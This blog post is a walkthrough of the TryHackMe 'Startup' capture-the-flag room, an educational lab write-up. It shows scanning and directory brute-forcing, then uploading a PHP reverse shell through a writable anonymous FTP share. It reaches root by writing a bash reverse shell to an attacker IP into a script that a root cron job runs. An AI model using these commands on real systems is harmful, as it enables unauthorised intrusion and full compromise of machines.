---
layout: post
title: Startup | Tryhackme 
date: 2021-11-05
description: You’ll find this post in your `_posts` directory. Go ahead and edit it and re-build the site to see your changes. # Add post description (optional)
img: startup/images.png  # Add image post (optional)
tags: [] # add tag
---

<p align="center">
<img src="/assets/img/startup/init.png" width="550"/>
</p>


Let's start....

### Add to hosts file

>  sudo leafpad /etc/hosts

<div>
<div class="code-label" title="/var/www/your_domain/html/index.html">/etc/hosts</div>
  <div class="new-align"> hello</div>
</div>
  
file is a simple text file that associates IP addresses with hostnames, one line per IP address.

### Scan the host in Nmap

    sudo nmap -sC -sV startup.thm
     
    -sC is for running default scripts
    -sV is for enumerating version

<p align="left">
<img src="/assets/img/startup/nmap-full-scan.png" width="450"/>
</p>

From the output, we can see we have 3 ports open. FTP is running on port 21 and SSH runs on port 22, while HTTP runs on port 80. Now we know what ports are open and what services they are running.FTP login with username is anonymous and password is null.

### Enumerating FTP service

> ftp startup.thm

<p align="left">
<img src="/assets/img/startup/ftp-dir-1.png" width="350"/>
</p>

In analyze of FTP service,  dir -a is used to list all files and folders, even the hidden ones. As few files and read them looking at the permission on the left side, lets download them to our machine.

### Downloading files from ftp

> get important.jpg
>
> get notice.txt

<p align="left">
<img src="/assets/img/startup/download-ftp-files.png" width="350"/>
</p>

Content of notice.txt

<p align="left">
<img src="/assets/img/startup/notice-text.png" width="350"/>
</p>

Here ftp directory check the directory for further steps.

<p align="left">
<img src="/assets/img/startup/ftp-dir-2.png" width="350"/>
</p>

There is nothing is see that.

So we have to look to web service.

<p align="left">
<img src="/assets/img/startup/home.png" width="350"/>
</p>

Check the robots.txt file on the website, but it's not there.

Here, I decided to brute-force the directory using the wfuzz tool.

```
 wfuzz -w /usr/share/SecLists/discovery/Webcontents/raft-large-directories.txt -u http://startup.thm/FUZZ
```

<p align="left">
<img src="/assets/img/startup/wfuzz.png" width="350"/>
</p>

### Checking the /files

<p align="left">
<img src="/assets/img/startup/files-dir.png" width="350"/>
</p>

Well this looks interesting as this contains the files and folders from FTP service. Write permission on that FTP server, upload a PHP script on the webserver.

### Revisiting the FTP server 

<p align="left">
<img src="/assets/img/startup/ftp-per.png" width="350"/>
</p>

/ftp directory have write permission. Upload a PHP reverse shell to ftp.

### Content of shell.php

Download <a class="link-a" href="https://github.com/safwanpaloli/Reverse-shell/blob/main/php-reverse-shell" target="_blank">PHP SHELL</a>

In php-shell script replace the IP and ports with our own ip and ports address.

Check the local system IP address

```
 ifconfig tun0 | grep -i 'inet ' | awk -F' ' '{print $2}'
```

<p align="left">
<img src="/assets/img/startup/ip.png" width="550"/>
</p>

<p align="left">
<img src="/assets/img/startup/php-shell.png" width="350"/>
</p>

### Uploading the file to the FTP Server

 > put phpshell.php 
 
<p align="left">
<img src="/assets/img/startup/file-upload-ftp.png" width="350"/>
</p>

The file has been successfully written.

### Checking the webserver

<p align="left">
<img src="/assets/img/startup/file-uploaded-web.png" width="350"/>
</p>

The file is also reflected in the webserver.

### Netcat listerner

Run the commands on the system

> nc -lvnp 33456

<p align="left">
<img src="/assets/img/startup/netcat-listerning.png" width="350"/>
</p>

Click on the PHP shell. Get a shell back

<p align="left">
<img src="/assets/img/startup/shell1.png" width="350"/>
</p>


The shell is not interactive, so it is a bit difficult to work with. It lacks using arrow keys, autocompletion, and using keys like CTRL+C to kill a process. Make this a more interactive session.


### Getting a proper TTY

Now lets get a proper shell with auto completion.

>   python3 -c "import pty;pty.spawn('/bin/bash')"

Hit CRTL+z to background the current process and on local box 

> stty raw -echo

and type fg and hit enter twice and on the reverse shell export the TERM as xterm.

>  export TERM=xterm

Now we have a proper shell.

We found a file that gives us the secret ingredient of the recipe.

<p align="left">
<img src="/assets/img/startup/reciept.png" width="350"/>
</p>

### Privilege Escalation

Run <a class="link-a" href="https://github.com/safwanpaloli/PEASS-ng/tree/master/linPEAS">linpeas</a> or <a class="link-a" href="https://github.com/safwanpaloli/LinEnum">LinEnum</a> scripts to identify possible privilege escalation point-to-point vectors. Linpeas has color highlighting so it makes life easier; open a python HTTP server and download the script from the remote machine.

### Download linpeas.sh

```
 wget https://raw.githubusercontent.com/carlospolop/privilege-escalation-awesome-scripts-suite/master/linPEAS/linpeas.sh
```

<p align="left">
<img src="/assets/img/startup/download-linpeas-sh.png" width="350"/>
</p>

### Serving the file using HTTP server

<p align="left">
<img src="/assets/img/startup/python-server-local.png" width="450"/>
</p>

### Downloading the file on the remote server

<p align="left">
<img src="/assets/img/startup/wget-linpease.png" width="350"/>
</p>

lets run the script.

> bash linpeas.sh

<p align="left">
<img src="/assets/img/startup/linpeas-run.png" width="350"/>
</p>
 
### Interesting findings on linpeas

<p align="left">
<img src="/assets/img/startup/writable-linpeas.png" width="350"/>
</p>

<p align="left">
<img src="/assets/img/startup/unexpected-root.png" width="350"/>
</p>

<p align="left">
<img src="/assets/img/startup/useful-soft-linpeas.png" width="350"/>
</p>

### /incidents

<p align="left">
<img src="/assets/img/startup/dir-incidents.png" width="350"/>
</p>

A pcapng file on /incidents folder. Now to analyse the file, download <a class="link-a" href="https://www.wireshark.org/#download">this</a> file to our machine and then use Wireshark to check the content of this file. Check this for downloading and installation instructions.
  
As before, open an HTTP server in Python on the remote machine, and download the file from our machine. 

### Run HTTP server on the remote box 
 
<p align="left">
<img src="/assets/img/startup/python-server.png" width="350"/>
</p>
 
### Download file on our machine

<p align="left">
<img src="/assets/img/startup/file-download-suspicious.png" width="350"/>
</p>

### Analysing with wireshark

> wireshark suspicious.pcapng

<p align="left">
<img src="/assets/img/startup/ezgif.com-gif-maker.gif" width="450"/>
</p>

The content of the stream contains lennie's password. 

<p align="left">
<img src="/assets/img/startup/suspious-lennie-password.png" width="350"/>
</p>


### Login SSH service 

SSH, also known as Secure Shell or Secure Socket Shell, is a network protocol that gives users, particularly system administrators, a secure way to access a computer over an unsecured network. Default port number is 22.

> ssh lennie@startup.thm 

<p align="left">
<img src="/assets/img/startup/ssh-login.png" width="350"/>
</p>

List the files using `ls` command. There is files and directory. read user.txt

<p align="left">
<img src="/assets/img/startup/user.txt.png" width="350"/>
</p>

### Getting a root shell

Looking under lennie’s home directory, folder named `scripts`.

<p align="left">
<img src="/assets/img/startup/list-all-lennie.png" width="350"/>
</p>

Reading the script named `planner.sh` makes it clear that a cronjob is running

<p align="left">
<img src="/assets/img/startup/list-all-lennie.png" width="350"/>
</p>

Upload `pspy64` and run it. This monitors any commands or cronjobs run that is viewable to our user.

### Downloading pspy on our local box

```
wget https://github.com/DominicBreuker/pspy/releases/download/v1.2.0/pspy64 
```

<p align="left">
<img src="/assets/img/startup/pspy64-download.png" width="350"/>
</p>

### Uploading file to the remote machine

```
scp pspy64 lennie@startup.thm:/dev/thm/pspy64
```


<p align="left">
<img src="/assets/img/startup/scp-psy.png" width="350"/>
</p>

Make an executable file and run it. Wait for the cron to run, then pspy will show the result.

> chmod +x pspy64

<p align="left">
<img src="/assets/img/startup/change-dir-pspy.png" width="350"/>
</p>

> ./pspy64 

<p align="left">
<img src="/assets/img/startup/pspy64.png" width="350"/>
</p>

### analyse the pspy result

<p align="left">
<img src="/assets/img/startup/cron-job.png" width="450"/>
</p>


Edit planner.sh with a reverse shell, it will gain root access. Trying to edit a file, notified that root owns it, and that is the only person who can edit it.

<p align="left">
<img src="/assets/img/startup/ls-planner.png" width="450"/>
</p>

In the planner.sh script, at the end of the script it executes /etc/print.sh

<p align="left">
<img src="/assets/img/startup/read-planner.png" width="450"/>
</p>

Looking at /etc/print.sh and find lennie is allowed to edit this file

<p align="left">
<img src="/assets/img/startup/ls-print.png" width="450"/>
</p>

Perfect, now edit the file so that when root runs planner.sh it will also execute print.sh. Create a reverse shell command using the <a class="link-a" href="https://github.com/safwanpaloli/Reverse-shell/blob/main/Reverse%20shell%20payloads">Reverse Shell Cheatsheet</a>, editing only the local machine IP address.

```
echo 'bash -c "bash -i >& /dev/tcp/10.2.99.122/8001 0>&1"' > /etc/print.sh
```

Set up a nc listener and wait around a minute for a callback

> nc -lvnp 8001

<p align="left">
<img src="/assets/img/startup/root-access.png" width="350"/>
</p>

As root user, now read root.txt

<p align="left">
<img src="/assets/img/startup/root.png" width="350"/>
</p>

